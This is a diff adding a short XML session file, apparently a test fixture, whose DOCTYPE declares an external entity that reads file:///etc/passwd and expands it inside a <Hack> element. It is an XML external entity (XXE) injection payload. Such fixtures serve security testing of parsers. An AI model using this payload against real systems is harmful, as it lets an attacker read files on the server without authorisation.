@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
+<SessionRoot>
+    <Sessions>
+        <Session id="one" valid="true"/>
+        <Session id="two" valid="false" />
+    </Sessions>    
+    <Hack>&xxe;</Hack>
+</SessionRoot>
